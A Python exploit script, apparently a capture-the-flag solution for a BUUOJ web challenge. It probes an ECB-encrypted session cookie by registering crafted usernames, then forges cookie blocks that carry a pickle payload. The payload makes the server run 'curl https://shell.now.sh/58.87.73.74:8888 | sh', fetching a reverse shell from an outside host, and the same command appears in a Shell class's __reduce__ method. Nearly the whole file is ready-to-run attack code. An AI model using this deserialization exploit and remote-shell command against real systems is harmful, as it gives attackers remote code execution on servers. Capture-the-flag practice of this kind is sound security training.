import requests
import random
import pickle
import os
import struct
import collections

url = "http://f6cec16c-02de-4f6e-8d86-cb6a38bb9bd7.node3.buuoj.cn/"

def register(username, password):
    while True:
        try:
            prefix = bytes([random.randint(0x20, 0x7e) for i in range(6)])
            s = requests.session()
            req = s.post(url+"/register", data={"username": prefix+username, "password":password})
            return s.cookies.get_dict()
        except (KeyError, requests.exceptions.ConnectionError):
            pass

def split32_check(cookie):
    g = [cookie[i:i+32] for i in range(0, len(cookie), 32)]
    if len(list(g)) != len(set(g)):
        l = [item for item, count in collections.Counter(g).items() if count > 1]
        return l[0]
    return None

def check_n():
    for i in range(200):
        cookie = register(b'X'*i, 'testpassword')["session"]
        if not split32_check(cookie):
            continue
        else:
            print("n =", i)
            print("Cookie =", cookie)
            return i, split32_check(cookie)

def restore_tail():
    tail = b""
    while len(tail)!=16:
        for c in range(0, 255):
            username = bytes([random.randint(0x20, 0x7e) for i in range(12)])
            username = username+ (16 - len(tail) - 1) * b'X' + tail + bytes([c])
            username = username + ((16 - len(tail) - 1) * b'X')
            cookie = register(username, 'testpassword')['session']
            if split32_check(cookie):
                tail+=bytes([c])
                print("tail now: ", tail)
                break
    return tail


class Shell(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'curl https://shell.now.sh/58.87.73.74:8888 | sh'",))

def gen_payload(cmd):
    payload = b'q\x01' # 结束前一个字符串
    payload += b"cposix\nsystem\n(X"+struct.pack('<I', len(cmd))+cmd+b"tR" #payload_forwin
    payload += b"e.\x00\x00\x00\x00\x00" # 闭合+ pickle结束
    return payload

if __name__ == "__main__":
    # Step One
    # check_n()
    n, repeat = check_n()
    print(repeat)
    # Step Two 
    # tail = restore_tail()
    # print(tail)
    # tail = b'q\x01Ne.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    # Step Three
    payload = gen_payload(b"curl https://shell.now.sh/58.87.73.74:8888 | sh")
    # Step Four
    payload += b'\x00'*((16 - len(payload) % 16) % 16) # 补齐到16整数倍
    username = bytes([random.randint(0x20, 0x7e) for i in range(n-32)])
    username += payload
    cookie = register(username, 'password')["session"]
    new_cookie = cookie[:32]
    for i in range(int(len(payload) / 16)):
        new_cookie += repeat
    
    new_cookie += cookie[32:]
    req = requests.get(url, cookies={"session":new_cookie})